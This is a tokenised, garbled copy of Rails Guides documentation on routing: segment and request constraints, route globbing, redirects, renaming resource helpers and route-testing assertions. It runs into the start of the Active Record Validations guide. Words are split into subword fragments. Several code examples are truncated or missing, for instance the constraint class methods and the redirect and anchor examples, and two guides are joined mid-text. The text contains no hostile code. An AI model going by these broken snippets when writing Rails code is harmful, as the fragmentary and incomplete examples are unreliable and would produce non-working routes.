▁NOTE : ▁You ▁can ' t ▁use ▁`: namespace ` ▁or ▁`: module ` ▁with ▁a ▁`: controller ` ▁path ▁segment .
▁If ▁you ▁need ▁to ▁do ▁this ▁the n ▁use ▁a ▁constraint ▁on ▁: controller ▁that ▁matches ▁the ▁ namespace ▁you ▁require . ▁e . g :
▁get ▁' : controller ( / : action ( / : id ) ) ' , ▁controller : ▁/ admin \ / [ ^ \ / ] + /
▁TIP : ▁By ▁default , ▁dynamic ▁segment s ▁don ' t ▁accept ▁do t s ▁- ▁this ▁is ▁because ▁the ▁do t ▁is ▁used ▁as ▁a ▁ separator ▁for ▁ formatted ▁routes .
▁If ▁you ▁need ▁to ▁use ▁a ▁do t ▁within ▁a ▁dynamic ▁segment , ▁add ▁a ▁constraint ▁that ▁override s ▁this ▁ – ▁for ▁example , ▁` id : ▁/ [ ^ \ / ] + / ` ▁allows ▁anything ▁except ▁a ▁ slash .
▁### ▁Static ▁S eg ment s
▁You ▁can ▁specify ▁static ▁segment s ▁when ▁creating ▁a ▁route ▁by ▁not ▁pre pending ▁a ▁co lo n ▁to ▁a ▁fragment :
▁get ▁' : controller / : action / : id / with _ user / : user _ id '
▁This ▁route ▁would ▁respond ▁to ▁paths ▁such ▁as ▁` / photos / show /1/ with _ user / 2 `.
▁In ▁this ▁case , ▁` params ` ▁would ▁be ▁` { ▁controller : ▁' photos ' , ▁action : ▁' show ' , ▁id : ▁' 1 ' , ▁user _ id : ▁' 2 ' ▁}` .
▁### ▁The ▁ Query ▁ String
▁The ▁` params ` ▁will ▁also ▁include ▁any ▁parameters ▁from ▁the ▁query ▁string .
▁For ▁example , ▁with ▁this ▁route :
▁get ▁' : controller / : action / : id '
▁An ▁in com ing ▁path ▁of ▁` / photos / show /1 ? user _ id = 2 ` ▁will ▁be ▁ dispatch ed ▁to ▁the ▁` show ` ▁action ▁of ▁the ▁` P h o to s ` ▁controller .
▁` params ` ▁will ▁be ▁` { ▁controller : ▁' photos ' , ▁action : ▁' show ' , ▁id : ▁' 1 ' , ▁user _ id : ▁' 2 ' ▁}` .
▁### ▁Defin ing ▁Defaults
▁You ▁do ▁not ▁need ▁to ▁explicitly ▁use ▁the ▁`: controller ` ▁and ▁`: action ` ▁symbols ▁within ▁a ▁route .
▁You ▁can ▁supply ▁them ▁as ▁defaults :
▁get ▁' photos / : id ' , ▁to : ▁' photos # show '
▁With ▁this ▁route , ▁Rails ▁will ▁match ▁an ▁in com ing ▁path ▁of ▁` / photos / 12 ` ▁to ▁the ▁` show ` ▁action ▁of ▁` PhotosController `.
▁You ▁can ▁also ▁define ▁other ▁defaults ▁in ▁a ▁route ▁by ▁supply ing ▁a ▁hash ▁for ▁the ▁`: default s ` ▁option .
▁This ▁even ▁applies ▁to ▁parameters ▁that ▁you ▁do ▁not ▁specify ▁as ▁dynamic ▁segment s .
▁For ▁example :
▁get ▁' photos / : id ' , ▁to : ▁' photos # show ' , ▁defaults : ▁ { ▁format : ▁' jpg ' ▁ }
▁Rails ▁would ▁match ▁` photos / 12 ` ▁to ▁the ▁` show ` ▁action ▁of ▁` PhotosController `, ▁and ▁set ▁` params [: format ]` ▁to ▁` " jpg " `.
▁### ▁N am ing ▁Routes
▁You ▁can ▁specify ▁a ▁name ▁for ▁any ▁route ▁using ▁the ▁`: as ` ▁option :
▁get ▁' ex it ' , ▁to : ▁' sessions # destroy ' , ▁as : ▁: logout
▁This ▁will ▁create ▁` logout _ path ` ▁and ▁` logout _ url ` ▁as ▁named ▁helpers ▁in ▁your ▁application .
▁Call ing ▁` logout _ path ` ▁will ▁return ▁` / ex it `
▁You ▁can ▁also ▁use ▁this ▁to ▁override ▁routing ▁methods ▁defined ▁by ▁resources , ▁like ▁this :
▁get ▁' : user name ' , ▁to : ▁' users # show ' , ▁as : ▁: user
▁This ▁will ▁define ▁a ▁` user _ path ` ▁method ▁that ▁will ▁be ▁available ▁in ▁controllers , ▁helpers ▁and ▁views ▁that ▁will ▁go ▁to ▁a ▁route ▁such ▁as ▁` / b ob `.
▁In side ▁the ▁` show ` ▁action ▁of ▁` UsersController `, ▁` params [: user name ]` ▁will ▁contain ▁the ▁username ▁for ▁the ▁user .
▁Change ▁`: user name ` ▁in ▁the ▁route ▁definition ▁if ▁you ▁do ▁not ▁want ▁your ▁parameter ▁name ▁to ▁be ▁`: user name `.
▁### ▁HTTP ▁Verb ▁ Constraint s
▁In ▁general , ▁you ▁should ▁use ▁the ▁` get `, ▁` post `, ▁` put `, ▁` patch ` ▁and ▁` delete ` ▁methods ▁to ▁constrain ▁a ▁route ▁to ▁a ▁particular ▁verb .
▁You ▁can ▁use ▁the ▁` match ` ▁method ▁with ▁the ▁`: via ` ▁option ▁to ▁match ▁multiple ▁verb s ▁at ▁once :
▁match ▁' photos ' , ▁to : ▁' photos # show ' , ▁via : ▁[ : get , ▁: post ]
▁You ▁can ▁match ▁all ▁verb s ▁to ▁a ▁particular ▁route ▁using ▁` via : ▁: all ` :
▁match ▁' photos ' , ▁to : ▁' photos # show ' , ▁via : ▁: all
▁NOTE : ▁ Routing ▁both ▁` GET ` ▁and ▁` POST ` ▁requests ▁to ▁a ▁single ▁action ▁has ▁security ▁implications .
▁### ▁S eg ment ▁ Constraint s
▁You ▁can ▁use ▁the ▁`: constraints ` ▁option ▁to ▁enforce ▁a ▁format ▁for ▁a ▁dynamic ▁segment :
▁get ▁' photos / : id ' , ▁to : ▁' photos # show ' , ▁constraints : ▁ { ▁id : ▁/ [ A - Z ] \ d { 5 } / ▁ }
▁This ▁route ▁would ▁match ▁paths ▁such ▁as ▁` / photos / A 12345 `, ▁but ▁not ▁` / photos / 89 3 `.
▁You ▁can ▁more ▁succinct ly ▁express ▁the ▁same ▁route ▁this ▁way :
▁get ▁' photos / : id ' , ▁to : ▁' photos # show ' , ▁id : ▁/ [ A - Z ] \ d { 5 } /
▁`: constraints ` ▁take s ▁regular ▁expression s ▁with ▁the ▁restrict ion ▁that ▁regex p ▁an ch or s ▁can ' t ▁be ▁used .
▁For ▁example , ▁the ▁following ▁route ▁will ▁not ▁work :
▁However , ▁note ▁that ▁you ▁don ' t ▁need ▁to ▁use ▁an ch or s ▁because ▁all ▁routes ▁are ▁an ch or ed ▁at ▁the ▁start .
▁get ▁' / : user name ' , ▁to : ▁' users # show '
▁### ▁ Request - Base d ▁ Constraint s
▁You ▁specify ▁a ▁request - base d ▁constraint ▁the ▁same ▁way ▁that ▁you ▁specify ▁a ▁segment ▁constraint :
▁You ▁can ▁also ▁specify ▁constraints ▁in ▁a ▁block ▁form :
▁constraints ▁sub domain : ▁' admin ' ▁do
▁There for e , ▁constraint ▁values ▁should ▁match ▁the ▁corresponding ▁ Request ▁object ▁method ▁return ▁type .
▁For ▁example : ▁` constraints : ▁ { ▁sub domain : ▁' api ' ▁}` ▁will ▁match ▁an ▁` api ` ▁sub domain ▁as ▁expected , ▁however ▁using ▁a ▁symbol ▁` constraints : ▁ { ▁sub domain : ▁: api ▁}` ▁will ▁not , ▁because ▁` request . sub domain ` ▁returns ▁` ' api ' ` ▁as ▁a ▁ String .
▁### ▁A d v ance d ▁ Constraint s
▁If ▁you ▁have ▁a ▁more ▁advanced ▁constraint , ▁you ▁can ▁provide ▁an ▁object ▁that ▁respond s ▁to ▁` match es ?` ▁that ▁Rails ▁should ▁use .
▁Let ' s ▁say ▁you ▁want ed ▁to ▁route ▁all ▁users ▁on ▁a ▁blacklist ▁to ▁the ▁` B la c k list Controller `.
▁You ▁could ▁do :
▁class ▁B la c k list Constraint
▁def ▁initialize
▁@ ips ▁= ▁B la c k list . r etriev e _ ips
▁def ▁matches ?(
▁@ ips . include ?(
▁Rails . application . routes . d raw ▁do
▁get ▁' * path ' , ▁to : ▁' b la c k list # index ' ,
▁constraints : ▁B la c k list Constraint . new
▁You ▁can ▁also ▁specify ▁constraints ▁as ▁a ▁ lambda :
▁constraints : ▁ lambda ▁ { ▁| request | ▁B la c k list . r etriev e _ ips . include ?(
▁request . remote _ ip ) ▁ }
▁Bo th ▁the ▁` match es ?` ▁method ▁and ▁the ▁ lambda ▁get s ▁the ▁` request ` ▁object ▁as ▁an ▁argument .
▁### ▁Route ▁G lo b b ing ▁and ▁Wi l d card ▁S eg ment s
▁Route ▁g lo b b ing ▁is ▁a ▁way ▁to ▁specify ▁that ▁a ▁particular ▁parameter ▁should ▁be ▁match ed ▁to ▁all ▁the ▁remain ing ▁parts ▁of ▁a ▁route .
▁get ▁' photos / * other ' , ▁to : ▁' photos # unknown '
▁This ▁route ▁would ▁match ▁` photos / 12 ` ▁or ▁` / photos / long / path / to / 12 `, ▁setting ▁` params [: other ]` ▁to ▁` " 12 " ` ▁or ▁` " long / path / to / 12 " `.
▁The ▁fragment s ▁prefix ed ▁with ▁a ▁sta r ▁are ▁called ▁" w il d card ▁segment s ".
▁Wi l d card ▁segment s ▁can ▁occur ▁any where ▁in ▁a ▁route .
▁get ▁' books / * section / : title ' , ▁to : ▁' books # show '
▁would ▁match ▁` books / some / section / last - words - a - me m o ir ` ▁with ▁` params [: section ]` ▁equal s ▁` ' some / section ' `, ▁and ▁` params [: title ]` ▁equal s ▁` ' last - words - a - me m o ir ' `.
▁ Technical ly , ▁a ▁route ▁can ▁have ▁even ▁more ▁than ▁one ▁ w il d card ▁segment .
▁The ▁match er ▁assign s ▁segment s ▁to ▁parameters ▁in ▁an ▁in t u i tive ▁way .
▁get ▁' * a / foo / * b ' , ▁to : ▁' test # index '
▁would ▁match ▁` z oo / w oo / foo / bar / baz ` ▁with ▁` params [: a ]` ▁equal s ▁` ' z oo / w oo ' `, ▁and ▁` params [: b ]` ▁equal s ▁` ' bar / baz ' `.
▁If ▁you ▁want ▁the ▁old ▁3.0 . x ▁behavior ▁back , ▁you ▁could ▁supply ▁` format : ▁false ` ▁like ▁this :
▁get ▁' * pages ' , ▁to : ▁' pages # show ' , ▁format : ▁false
▁NOTE : ▁If ▁you ▁want ▁to ▁make ▁the ▁format ▁segment ▁m and a tory , ▁so ▁it ▁cannot ▁be ▁omitted , ▁you ▁can ▁supply ▁` format : ▁true ` ▁like ▁this :
▁get ▁' * pages ' , ▁to : ▁' pages # show ' , ▁format : ▁true
▁You ▁can ▁redirect ▁any ▁path ▁to ▁another ▁path ▁using ▁the ▁` redirect ` ▁helper ▁in ▁your ▁route r :
▁You ▁can ▁also ▁reuse ▁dynamic ▁segment s ▁from ▁the ▁match ▁in ▁the ▁path ▁to ▁redirect ▁to :
▁You ▁can ▁also ▁provide ▁a ▁block ▁to ▁redirect , ▁which ▁receive s ▁the ▁ symbolize d ▁path ▁parameters ▁and ▁the ▁request ▁object :
▁P lease ▁note ▁that ▁this ▁redirect ion ▁is ▁a ▁30 1 ▁" M o ve d ▁P er ma n ent ly " ▁redirect .
▁ K eep ▁in ▁mind ▁that ▁some ▁web ▁browsers ▁or ▁ proxy ▁server s ▁will ▁cache ▁this ▁type ▁of ▁redirect , ▁making ▁the ▁old ▁page ▁in accessible .
▁In ▁all ▁of ▁these ▁cases , ▁if ▁you ▁don ' t ▁provide ▁the ▁leading ▁host ▁( ` http :// www . example . com ` ), ▁Rails ▁will ▁take ▁those ▁details ▁from ▁the ▁current ▁request .
▁### ▁ Routing ▁to ▁Rack ▁Application s
▁match ▁' / application . js ' , ▁to : ▁Sprockets , ▁via : ▁: all
▁As ▁long ▁as ▁` Sprockets ` ▁respond s ▁to ▁` c all ` ▁and ▁returns ▁a ▁` [ status , ▁headers , ▁body ]` , ▁the ▁route r ▁won ' t ▁know ▁the ▁difference ▁between ▁the ▁Rack ▁application ▁and ▁an ▁action .
▁This ▁is ▁an ▁appropriate ▁use ▁of ▁` via : ▁: all `, ▁as ▁you ▁will ▁want ▁to ▁allow ▁your ▁Rack ▁application ▁to ▁handle ▁all ▁verb s ▁as ▁it ▁consider s ▁appropriate .
▁### ▁Using ▁` root `
▁You ▁can ▁specify ▁what ▁Rails ▁should ▁route ▁` ' / ' ` ▁to ▁with ▁the ▁` root ` ▁method :
▁root ▁to : ▁' pages # main '
▁root ▁' pages # main ' ▁# ▁shortcut ▁for ▁the ▁above
▁You ▁should ▁put ▁the ▁` root ` ▁route ▁at ▁the ▁to p ▁of ▁the ▁file , ▁because ▁it ▁is ▁the ▁most ▁popular ▁route ▁and ▁should ▁be ▁match ed ▁first .
▁NOTE : ▁The ▁` root ` ▁route ▁only ▁routes ▁` GET ` ▁requests ▁to ▁the ▁action .
▁You ▁can ▁also ▁use ▁root ▁inside ▁ namespace s ▁and ▁scope s ▁as ▁well .
▁root ▁to : ▁" admin # index "
▁root ▁to : ▁" home # index "
▁### ▁Un i code ▁character ▁routes
▁You ▁can ▁specify ▁un i code ▁character ▁routes ▁directly .
▁get ▁' こんにちは ' , ▁to : ▁' welcome # index '
▁C us to m i z ing ▁Resource ful ▁Routes
▁Rails ▁allows ▁you ▁to ▁customize ▁virtual ly ▁any ▁generic ▁part ▁of ▁the ▁resource ful ▁helpers .
▁### ▁Specif ying ▁a ▁Controller ▁to ▁Use
▁The ▁`: controller ` ▁option ▁let s ▁you ▁explicitly ▁specify ▁a ▁controller ▁to ▁use ▁for ▁the ▁resource .
▁resources ▁: photos , ▁controller : ▁' images '
▁will ▁recognize ▁in com ing ▁paths ▁beginning ▁with ▁` / photos ` ▁but ▁route ▁to ▁the ▁` Image s ` ▁controller :
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Name d ▁ Helper ▁|
▁| ▁ --------- ▁| ▁ ---------------- ▁| ▁- ---------------- ▁| ▁-------------- ------ ▁|
▁| ▁GET ▁| ▁/ photos ▁| ▁images # index ▁| ▁ photos _ path ▁|
▁| ▁GET ▁| ▁/ photos / new ▁| ▁images # new ▁| ▁new _ photo _ path ▁|
▁| ▁POST ▁| ▁/ photos ▁| ▁images # create ▁| ▁ photos _ path ▁|
▁| ▁GET ▁| ▁/ photos / : id ▁| ▁images # show ▁| ▁ photo _ path (: id ) ▁|
▁| ▁GET ▁| ▁/ photos / : id / edit ▁| ▁images # edit ▁| ▁edit _ photo _ path (: id ) ▁|
▁| ▁ PATCH / PUT ▁| ▁/ photos / : id ▁| ▁images # update ▁| ▁ photo _ path (: id ) ▁|
▁| ▁DELETE ▁| ▁/ photos / : id ▁| ▁images # destroy ▁| ▁ photo _ path (: id ) ▁|
▁NOTE : ▁Use ▁` photos _ path `, ▁` new _ photo _ path `, ▁etc . ▁to ▁generate ▁paths ▁for ▁this ▁resource .
▁For ▁namespaced ▁controllers ▁you ▁can ▁use ▁the ▁directory ▁notation .
▁resources ▁: user _ permission s , ▁controller : ▁' admin / user _ permission s '
▁This ▁will ▁route ▁to ▁the ▁` Admin :: User P er m is s ion s ` ▁controller .
▁NOTE : ▁On ly ▁the ▁directory ▁notation ▁is ▁supported .
▁Specif ying ▁the < n > controller ▁with ▁Ruby ▁constant ▁notation ▁( eg . ▁` controller : ▁' Admin :: User P er m is s ion s ' ` )< n > can ▁lead ▁to ▁routing ▁problem s ▁and ▁results ▁in < n > a ▁warning .
▁### ▁Specif ying ▁ Constraint s
▁You ▁can ▁use ▁the ▁`: constraints ` ▁option ▁to ▁specify ▁a ▁required ▁format ▁on ▁the ▁ implicit ▁` id `.
▁This ▁declaration ▁constrain s ▁the ▁`: id ` ▁parameter ▁to ▁match ▁the ▁supplied ▁regular ▁expression .
▁So , ▁in ▁this ▁case , ▁the ▁route r ▁would ▁no ▁longer ▁match ▁` / photos /1 ` ▁to ▁this ▁route .
▁Instead , ▁` / photos / R R 27 ` ▁would ▁match .
▁You ▁can ▁specify ▁a ▁single ▁constraint ▁to ▁apply ▁to ▁a ▁number ▁of ▁routes ▁by ▁using ▁the ▁block ▁form :
▁constraints ( id : ▁/ [ A - Z ] [ A - Z ] [ 0 - 9 ] + / ) ▁do
▁resources ▁: photos
▁resources ▁: account s
▁NOTE : ▁Of ▁course , ▁you ▁can ▁use ▁the ▁more ▁advanced ▁constraints ▁available ▁in ▁non - resource ful ▁routes ▁in ▁this ▁context .
▁TIP : ▁By ▁default ▁the ▁`: id ` ▁parameter ▁does n ' t ▁accept ▁do t s ▁- ▁this ▁is ▁because ▁the ▁do t ▁is ▁used ▁as ▁a ▁ separator ▁for ▁ formatted ▁routes .
▁If ▁you ▁need ▁to ▁use ▁a ▁do t ▁within ▁an ▁`: id ` ▁add ▁a ▁constraint ▁which ▁override s ▁this ▁- ▁for ▁example ▁` id : ▁/ [ ^ \ / ] + / ` ▁allows ▁anything ▁except ▁a ▁ slash .
▁### ▁ Overriding ▁the ▁Name d ▁ Helpers
▁The ▁`: as ` ▁option ▁let s ▁you ▁override ▁the ▁normal ▁naming ▁for ▁the ▁named ▁route ▁helpers .
▁resources ▁: photos , ▁as : ▁' images '
▁will ▁recognize ▁in com ing ▁paths ▁beginning ▁with ▁` / photos ` ▁and ▁route ▁the ▁requests ▁to ▁` PhotosController `, ▁but ▁use ▁the ▁value ▁of ▁the ▁: as ▁option ▁to ▁name ▁the ▁helpers .
▁| ▁GET ▁| ▁/ photos ▁| ▁ photos # index ▁| ▁images _ path ▁|
▁| ▁GET ▁| ▁/ photos / new ▁| ▁ photos # new ▁| ▁new _ image _ path ▁|
▁| ▁POST ▁| ▁/ photos ▁| ▁ photos # create ▁| ▁images _ path ▁|
▁| ▁GET ▁| ▁/ photos / : id ▁| ▁ photos # show ▁| ▁image _ path (: id ) ▁|
▁| ▁GET ▁| ▁/ photos / : id / edit ▁| ▁ photos # edit ▁| ▁edit _ image _ path (: id ) ▁|
▁| ▁ PATCH / PUT ▁| ▁/ photos / : id ▁| ▁ photos # update ▁| ▁image _ path (: id ) ▁|
▁| ▁DELETE ▁| ▁/ photos / : id ▁| ▁ photos # destroy ▁| ▁image _ path (: id ) ▁|
▁### ▁ Overriding ▁the ▁` new ` ▁and ▁` edit ` ▁S eg ment s
▁resources ▁: photos , ▁path _ name s : ▁ { ▁new : ▁' make ' , ▁edit : ▁' change ' ▁ }
▁This ▁would ▁cause ▁the ▁routing ▁to ▁recognize ▁paths ▁such ▁as :
▁/ photos / make
▁/ photos /1/ change
▁NOTE : ▁The ▁actual ▁action ▁names ▁are n ' t ▁changed ▁by ▁this ▁option .
▁The ▁two ▁paths ▁show n ▁would ▁ still ▁route ▁to ▁the ▁` new ` ▁and ▁` edit ` ▁actions .
▁TIP : ▁If ▁you ▁find ▁yourself ▁want ing ▁to ▁change ▁this ▁option ▁un i form ly ▁for ▁all ▁of ▁your ▁routes , ▁you ▁can ▁use ▁a ▁scope .
▁scope ▁path _ name s : ▁ { ▁new : ▁' make ' ▁ } ▁do
▁# ▁rest ▁of ▁your ▁routes
▁### ▁P ref i x ing ▁the ▁Name d ▁Route ▁ Helpers
▁You ▁can ▁use ▁the ▁`: as ` ▁option ▁to ▁prefix ▁the ▁named ▁route ▁helpers ▁that ▁Rails ▁generates ▁for ▁a ▁route .
▁Use ▁this ▁option ▁to ▁prevent ▁name ▁co ll is ion s ▁between ▁routes ▁using ▁a ▁path ▁scope .
▁scope ▁' admin ' ▁do
▁resources ▁: photos , ▁as : ▁' admin _ photos '
▁To ▁prefix ▁a ▁group ▁of ▁route ▁helpers , ▁use ▁`: as ` ▁with ▁` scope ` :
▁scope ▁' admin ' , ▁as : ▁' admin ' ▁do
▁resources ▁: photos , ▁: account s
▁resources ▁: photos , ▁: account s
▁This ▁will ▁generate ▁routes ▁such ▁as ▁` admin _ photos _ path ` ▁and ▁` admin _ account s _ path ` ▁which ▁map ▁to ▁` / admin / photos ` ▁and ▁` / admin / account s ` ▁respectively .
▁NOTE : ▁The ▁` namespace ` ▁scope ▁will ▁automatically ▁add ▁`: as ` ▁as ▁well ▁as ▁`: module ` ▁and ▁`: path ` ▁prefix es .
▁You ▁can ▁prefix ▁routes ▁with ▁a ▁named ▁parameter ▁also :
▁scope ▁' : user name ' ▁do
▁### ▁Re str ic ting ▁the ▁Routes ▁Create d
▁You ▁can ▁use ▁the ▁`: only ` ▁and ▁`: except ` ▁options ▁to ▁fine - t un e ▁this ▁behavior .
▁The ▁`: only ` ▁option ▁tell s ▁Rails ▁to ▁create ▁only ▁the ▁specified ▁routes :
▁resources ▁: photos , ▁only : ▁[ : index , ▁: show ]
▁Now , ▁a ▁` GET ` ▁request ▁to ▁` / photos ` ▁would ▁succeed , ▁but ▁a ▁` POST ` ▁request ▁to ▁` / photos ` ▁( which ▁would ▁or dinarily ▁be ▁route d ▁to ▁the ▁` create ` ▁action ) ▁will ▁fail .
▁The ▁`: except ` ▁option ▁specifie s ▁a ▁route ▁or ▁list ▁of ▁routes ▁that ▁Rails ▁should ▁ _ not _ ▁create :
▁resources ▁: photos , ▁except : ▁: destroy
▁In ▁this ▁case , ▁Rails ▁will ▁create ▁all ▁of ▁the ▁normal ▁routes ▁except ▁the ▁route ▁for ▁` destroy ` ▁( a ▁` DELETE ` ▁request ▁to ▁` / photos / : id ` ).
▁TIP : ▁If ▁your ▁application ▁has ▁many ▁RESTful ▁routes , ▁using ▁`: only ` ▁and ▁`: except ` ▁to ▁generate ▁only ▁the ▁routes ▁that ▁you ▁actually ▁need ▁can ▁ cut ▁down ▁on ▁memory ▁use ▁and ▁speed ▁up ▁the ▁routing ▁process .
▁### ▁ Trans la t ed ▁Path s
▁Using ▁` scope `, ▁we ▁can ▁alter ▁path ▁names ▁generated ▁by ▁resources :
▁scope ( path _ name s : ▁ { ▁new : ▁' n e u ' , ▁edit : ▁' be ar be ite n ' ▁ }) ▁do
▁resources ▁: cat eg or ies , ▁path : ▁' kategorien '
▁Rails ▁now ▁creates ▁routes ▁to ▁the ▁` C ate g or ies Controller `.
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Name d ▁ Helper ▁|
▁| ▁ --------- ▁| ▁ ------------- ------------- ▁| ▁--------------- --- ▁| ▁-------------- --------- ▁|
▁| ▁GET ▁| ▁/ kategorien ▁| ▁categories # index ▁| ▁categories _ path ▁|
▁| ▁GET ▁| ▁/ kategorien / n e u ▁| ▁categories # new ▁| ▁new _ category _ path ▁|
▁| ▁POST ▁| ▁/ kategorien ▁| ▁categories # create ▁| ▁categories _ path ▁|
▁| ▁GET ▁| ▁/ kategorien / : id ▁| ▁categories # show ▁| ▁ category _ path (: id ) ▁|
▁| ▁GET ▁| ▁/ kategorien / : id / be ar be ite n ▁| ▁categories # edit ▁| ▁edit _ category _ path (: id ) ▁|
▁| ▁ PATCH / PUT ▁| ▁/ kategorien / : id ▁| ▁categories # update ▁| ▁ category _ path (: id ) ▁|
▁| ▁DELETE ▁| ▁/ kategorien / : id ▁| ▁categories # destroy ▁| ▁ category _ path (: id ) ▁|
▁### ▁ Overriding ▁the ▁S ing ul ar ▁For m
▁If ▁you ▁want ▁to ▁define ▁the ▁singular ▁form ▁of ▁a ▁resource , ▁you ▁should ▁add ▁ additional ▁rules ▁to ▁the ▁` In f le c to r ` :
▁ ActiveSupport :: In f le c to r . inflect ion s ▁do ▁| inflect |
▁ inflect . ir r egular ▁' to o th ' , ▁' t e e th '
▁### ▁Using ▁`: as ` ▁in ▁Nest ed ▁Resource s
▁The ▁`: as ` ▁option ▁override s ▁the ▁automatically - generated ▁name ▁for ▁the ▁resource ▁in ▁nested ▁route ▁helpers .
▁resources ▁: ads , ▁as : ▁' p er io d ical _ ads '
▁This ▁will ▁create ▁routing ▁helpers ▁such ▁as ▁` magazine _ p er io d ical _ ads _ url ` ▁and ▁` edit _ magazine _ p er io d ical _ ad _ path `.
▁P ar am et ers
▁In spec ting ▁and ▁Testing ▁Routes
▁Rails ▁offer s ▁facilit ies ▁for ▁ inspect ing ▁and ▁testing ▁your ▁routes .
▁### ▁Listing ▁ Ex ist ing ▁Routes
▁You ▁can ▁also ▁execute ▁the ▁` rake ▁routes ` ▁command ▁in ▁your ▁terminal ▁to ▁produce ▁the ▁same ▁output .
▁Bo th ▁methods ▁will ▁list ▁all ▁of ▁your ▁routes , ▁in ▁the ▁same ▁order ▁that ▁they ▁appear ▁in ▁` routes . rb `.
▁For ▁each ▁route , ▁you ' ll ▁see :
▁* ▁The ▁route ▁name ▁( if ▁any )
▁* ▁The ▁HTTP ▁verb ▁used ▁( if ▁the ▁route ▁does n ' t ▁respond ▁to ▁all ▁verb s )
▁* ▁The ▁URL ▁pattern ▁to ▁match
▁* ▁The ▁routing ▁parameters ▁for ▁the ▁route
▁For ▁example , ▁here ' s ▁a ▁small ▁section ▁of ▁the ▁` rake ▁routes ` ▁output ▁for ▁a ▁RESTful ▁route :
▁users ▁GET ▁/ users ( . : format ) ▁users # index
▁POST ▁/ users ( . : format ) ▁users # create
▁edit _ user ▁GET ▁/ users / : id / edit ( . : format ) ▁users # edit
▁You ▁may ▁restrict ▁the ▁list ing ▁to ▁the ▁routes ▁that ▁map ▁to ▁a ▁particular ▁controller ▁setting ▁the ▁` C ON T R O L L ER ` ▁environment ▁variable :
▁TIP : ▁You ' ll ▁find ▁that ▁the ▁output ▁from ▁` rake ▁routes ` ▁is ▁much ▁more ▁read able ▁if ▁you ▁ wide n ▁your ▁terminal ▁window ▁un til ▁the ▁output ▁lines ▁don ' t ▁wrap .
▁### ▁Testing ▁Routes
▁Routes ▁should ▁be ▁included ▁in ▁your ▁testing ▁strategy ▁( j us t ▁like ▁the ▁rest ▁of ▁your ▁application ).
▁Rails ▁offer s ▁three ▁[ built - in ▁assertion s ]( http :// api . rubyonrails . org / classes / ActionDispatch / Assertion s / Routing Assertion s . html ) ▁design ed ▁to ▁make ▁testing ▁routes ▁simple r :
▁* ▁` assert _ generate s `
▁* ▁` assert _ recognizes `
▁* ▁` assert _ routing `
▁#### ▁The ▁` assert _ generate s ` ▁ Assertion
▁` assert _ generate s ` ▁ assert s ▁that ▁a ▁particular ▁set ▁of ▁options ▁generate ▁a ▁particular ▁path ▁and ▁can ▁be ▁used ▁with ▁default ▁routes ▁or ▁custom ▁routes .
▁ assert _ generate s ▁' / photos /1 ' , ▁ { ▁controller : ▁' photos ' , ▁action : ▁' show ' , ▁id : ▁' 1 ' ▁ }
▁ assert _ generate s ▁' / about ' , ▁controller : ▁' pages ' , ▁action : ▁' about '
▁#### ▁The ▁` assert _ recognizes ` ▁ Assertion
▁` assert _ recognizes ` ▁is ▁the ▁inverse ▁of ▁` assert _ generate s `.
▁It ▁ assert s ▁that ▁a ▁given ▁path ▁is ▁recognize d ▁and ▁routes ▁it ▁to ▁a ▁particular ▁spot ▁in ▁your ▁application .
▁ assert _ recognizes ( { ▁controller : ▁' photos ' , ▁action : ▁' show ' , ▁id : ▁' 1 ' ▁ }, ▁' / photos /1 ')
▁You ▁can ▁supply ▁a ▁`: method ` ▁argument ▁to ▁specify ▁the ▁HTTP ▁verb :
▁ assert _ recognizes ( { ▁controller : ▁' photos ' , ▁action : ▁' create ' ▁ }, ▁ { ▁path : ▁' photos ' , ▁method : ▁: post ▁ })
▁#### ▁The ▁` assert _ routing ` ▁ Assertion
▁The ▁` assert _ routing ` ▁assertion ▁check s ▁the ▁route ▁both ▁ways : ▁it ▁tests ▁that ▁the ▁path ▁generates ▁the ▁options , ▁and ▁that ▁the ▁options ▁generate ▁the ▁path .
▁Thus , ▁it ▁combine s ▁the ▁functions ▁of ▁` assert _ generate s ` ▁and ▁` assert _ recognizes ` :
▁ assert _ routing ( { ▁path : ▁' photos ' , ▁method : ▁: post ▁ }, ▁ { ▁controller : ▁' photos ' , ▁action : ▁' create ' ▁ })
▁Active ▁Record ▁Validation s
▁This ▁guide ▁teach es ▁you ▁how ▁to ▁validate ▁the ▁state ▁of ▁objects ▁before ▁they ▁go ▁into < n > the ▁database ▁using ▁Active ▁Record ' s ▁validations ▁feature .
▁* ▁How ▁to ▁use ▁the ▁built - in ▁Active ▁Record ▁validation ▁helpers .
▁* ▁How ▁to ▁create ▁your ▁own ▁custom ▁validation ▁methods .
▁* ▁How ▁to ▁work ▁with ▁the ▁error ▁messages ▁generated ▁by ▁the ▁validation ▁process .
▁Validation s ▁Over view
▁Here ' s ▁an ▁example ▁of ▁a ▁very ▁simple ▁validation :
▁Person . create ( name : ▁" John ▁Doe ") . valid ?
▁Person . create ( name : ▁nil ). valid ?
▁As ▁you ▁can ▁see , ▁our ▁validation ▁let s ▁us ▁know ▁that ▁our ▁` Person ` ▁is ▁not ▁valid < n > with out ▁a ▁` name ` ▁attribute .
▁The ▁second ▁` Person ` ▁will ▁not ▁be ▁persist ed ▁to ▁the < n > database .
▁Before ▁we ▁d ig ▁into ▁more ▁details , ▁let ' s ▁t al k ▁about ▁how ▁validations ▁fit ▁into ▁the < n > b ig ▁ picture ▁of ▁your ▁application .
▁### ▁W h y ▁Use ▁Validation s ?
▁Validation s ▁are ▁used ▁to ▁ensure ▁that ▁only ▁valid ▁data ▁is ▁saved ▁into ▁your < n > database .
▁For ▁example , ▁it ▁may ▁be ▁important ▁to ▁your ▁application ▁to ▁ensure ▁that < n > ever y ▁user ▁provides ▁a ▁valid ▁email ▁address ▁and ▁mail ing ▁address .
▁Model - level < n > validations ▁are ▁the ▁best ▁way ▁to ▁ensure ▁that ▁only ▁valid ▁data ▁is ▁saved ▁into ▁your < n > database .
▁They ▁are ▁database ▁a g no s tic , ▁cannot ▁be ▁bypass ed ▁by ▁end ▁users , ▁and ▁are < n > co n ve n i ent ▁to ▁test ▁and ▁maintain .
▁Rails ▁make s ▁them ▁easy ▁to ▁use , ▁provides < n > built - in ▁helpers ▁for ▁common ▁needs , ▁and ▁allows ▁you ▁to ▁create ▁your ▁own ▁validation < n > methods ▁as ▁well .
▁There ▁are ▁sever al ▁other ▁ways ▁to ▁validate ▁data ▁before ▁it ▁is ▁saved ▁into ▁your < n > database , ▁including ▁native ▁database ▁constraints , ▁client - side ▁validations ,< n > controller - level ▁validations .
